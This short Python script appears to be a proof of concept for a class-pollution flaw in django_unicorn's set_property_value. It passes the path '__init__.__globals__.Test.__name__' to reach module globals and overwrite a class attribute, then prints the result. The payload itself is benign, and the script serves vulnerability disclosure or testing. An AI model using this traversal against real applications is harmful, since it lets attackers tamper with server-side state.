import django_unicorn.views.action_parsers.utils as action_parsers_utils
from django_unicorn.components import UnicornView
import os

class HelloWorldView(UnicornView):
    def __init__(self):
        pass
    
class Test():
    def __init__(self):
        pass

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'pocTest.settings')
action_parsers_utils.set_property_value(HelloWorldView(), "__init__.__globals__.Test.__name__", "polluted")
print(Test.__name__)